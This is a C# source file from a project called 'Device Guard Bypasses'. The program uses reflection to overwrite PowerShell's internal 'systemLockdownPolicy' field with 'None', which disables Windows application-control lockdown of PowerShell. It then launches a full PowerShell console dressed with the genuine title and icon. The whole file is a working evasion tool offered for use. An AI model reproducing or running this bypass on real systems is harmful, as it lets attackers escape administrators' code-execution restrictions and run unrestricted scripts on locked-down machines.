//  This file is part of Device Guard Bypasses
//
//  Device Guard Bypasses is free software: you can redistribute it 
//  and/or modify it under the terms of the GNU General Public License
//  as published by the Free Software Foundation, either version 3 of 
//  the License, or (at your option) any later version.
//
//  Foobar is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//  GNU General Public License for more details.
//
//  You should have received a copy of the GNU General Public License
//  along with Device Guard Bypasses. If not, see<http://www.gnu.org/licenses/>.

using Microsoft.PowerShell;
using System;
using System.Drawing;
using System.IO;
using System.Management.Automation.Security;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace RunPowershell
{
    static class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool AllocConsole();

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool SetConsoleTitle(string lpConsoleTitle);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SendMessage(
          IntPtr hWnd,
          int    Msg,
          int wParam,
          IntPtr lParam
        );

        const int WM_SETICON = 0x0080;
        const int ICON_BIG = 1;
        const int ICON_SMALL = 0;

        static void SetIcon()
        {
            try
            {
                IntPtr wnd = GetConsoleWindow();
                Icon icon = Icon.ExtractAssociatedIcon(
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System),
                        "WindowsPowerShell", "v1.0", "powershell.exe"));
                SendMessage(wnd, WM_SETICON, ICON_BIG, icon.Handle);
                SendMessage(wnd, WM_SETICON, ICON_SMALL, icon.Handle);
            }
            catch
            {
            }
        }

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            try
            {
                var fi = typeof(SystemPolicy).GetField("systemLockdownPolicy", 
                    BindingFlags.NonPublic | BindingFlags.Static);
                fi.SetValue(null, SystemEnforcementMode.None);
                
                AllocConsole();
                SetConsoleTitle("Windows Powershell");
                SetIcon();
                UnmanagedPSEntry ps = new UnmanagedPSEntry();
                ps.Start(null, args);
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
    }
}
